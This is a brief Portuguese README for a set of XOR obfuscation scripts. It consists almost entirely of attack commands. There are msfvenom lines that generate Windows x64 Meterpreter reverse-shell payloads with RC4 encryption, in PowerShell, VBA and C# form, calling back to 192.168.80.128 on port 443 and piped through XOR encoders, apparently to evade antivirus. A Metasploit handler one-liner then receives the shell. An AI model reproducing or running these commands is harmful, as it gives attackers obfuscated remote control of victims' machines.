# Modo de uso dos scripst

## Terminal para gerar os códigos:
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f ps1 EXITFUNC=thread | python xor_ps1.py

$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f vbapplication EXITFUNC=thread | python xor_vba.py

$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f csharp EXITFUNC=thread | python xor_csharp.py

```

## Metasploit Framework para receber o shell:

```
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp_rc4; set RC4PASSWORD password; set LHOST 192.168.80.128; set LPORT 443; exploit"
```
